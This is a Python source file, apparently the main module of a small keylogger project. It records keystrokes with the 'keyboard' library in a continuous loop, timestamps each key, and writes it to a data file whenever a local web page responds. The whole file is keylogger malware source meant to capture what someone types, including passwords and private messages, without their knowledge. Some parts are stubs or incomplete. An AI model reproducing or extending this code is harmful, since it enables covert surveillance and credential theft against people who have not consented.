# Execute Main
from backend.config.archive import DEFAULT_NAME_FILE
from backend import Keylogger, File
from time import time
from datetime import datetime, timedelta
import keyboard as k
import requests as r
import pandas as pd
import asyncio as a

class Main():
    def __init__(self, name = None):
        self.file = DEFAULT_NAME_FILE
        self.delay = 1
        self.task = []
        self.k = None
        self.url = "http://127.0.0.1:5500/project/frontend/index.html"
    
    @classmethod
    def run(cls):
        ...
        
    async def key(self):
        key = k.read_event().name
        j = {"date": datetime.now().strftime("%d/%m/%Y, %H:%M:%S"), "keys": key}
        self.k = j
        
    async def __call__(self, delay = None, minute=1, method = None, *args, **kwds):
        # Keylogger
        k = Keylogger(p = False)
        f = File(f"data/{self.file}")
        exe = k.exe
        if exe:
            try:
                response = r.get(self.url)
                key = await self.key()
                print(self.k)
                try:
                    if response.status_code == 200:
                        load = self.k
                        # Insert Data in File
                        await a.sleep(0.125)
                        await f.post(data = load)
                        
                except Exception as e:
                    raise e
                
            except ConnectionError:
                print("Error retrieving data via web, please try again")
            
        else:
            self.sleep = datetime.now() + timedelta(minutes=minute)
            await k.off(None, self.sleep.minute)
            
    async def table(self, method = None):
        f = File(f"data/{self.file}")
        f.get("data.csv")
        # Pd Dataframe

async def main():
    M = Main()
    while True:
        await M()
        await M.table()
        
a.run(main())